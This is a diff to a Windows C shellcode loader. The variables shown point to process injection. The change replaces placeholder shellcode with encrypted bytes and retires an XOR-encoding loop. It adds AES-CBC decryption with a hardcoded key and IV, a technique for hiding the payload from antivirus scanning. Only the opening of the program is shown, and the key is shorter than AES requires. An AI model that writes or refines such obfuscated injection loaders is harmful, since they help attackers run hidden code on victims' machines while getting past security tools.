@@ -1,19 +1,26 @@
 #include <stdio.h>
 #include <string.h>
 #include <Windows.h>
+#include "aes.h"
 int main(int argc, char* argv[]){
     DWORD pid=0;
     DWORD tid=0;
     HANDLE hprocess,hthread=NULL;
     LPVOID base =NULL;
-    unsigned char shellcode[] = "\x41\x41\x41\x41\x41\x41";
-    int i;
+    unsigned char shellcode[] = "\x2e\xfe\x72\x19\xe1\x48\xe3\x37\xb4\x37\x1f\x95\x84\xcc\xf4";
+    /*int i;
     char key = '!';
     for ( i = 0; i < sizeof(shellcode)-1; i++)
     {
         printf("//x%02x", shellcode[i]^key);
     }
-    
+    */
+   struct AES_ctx ctx;
+   unsigned char key[] = "1@_2wa&^r4";
+   unsigned char  iv[] = "\x9d\x02\x35\x3b\xa3\x4b\xec\x26\x13\x88\x58\x51\x11\x47\xa5\x98";
+   AES_init_ctx_iv(&ctx, key, iv);
+   AES_CBC_decrypt_buffer(&ctx,shellcode,sizeof(shellcode));
+
        if (argc <2)
     {
         printf("need at least 2 arguments:\t%s\n",argv[0]);
